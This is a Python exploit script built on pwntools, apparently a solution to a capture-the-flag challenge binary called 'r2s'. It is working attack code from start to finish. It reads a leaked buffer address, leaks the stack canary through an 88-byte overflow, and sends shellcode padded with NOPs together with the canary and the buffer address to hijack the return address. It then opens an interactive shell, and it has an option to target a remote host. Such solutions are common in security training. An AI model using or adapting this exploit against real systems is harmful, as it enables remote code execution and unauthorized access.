#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('r2s')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+154
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()



def solve():

    io.recvuntil("buf: ")
    buf = int(io.recvline().strip(), 16)
    info("buf addr: %#x", buf)

    offset = 88
    io.sendline(b"A"*offset)
    io.recvuntil(b"A"*offset + b"\n")
    canary = int(hex(u64(io.recv(7).strip().ljust(8, b"\x00"))) + "00", 16)
    info("canary value: %#x", canary)

    sh = asm(shellcraft.sh())
    payload = sh.ljust(offset, asm("nop")) + p64(canary) + b'C'*8 + p64(buf)
    io.sendline(payload)

    io.interactive()



def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

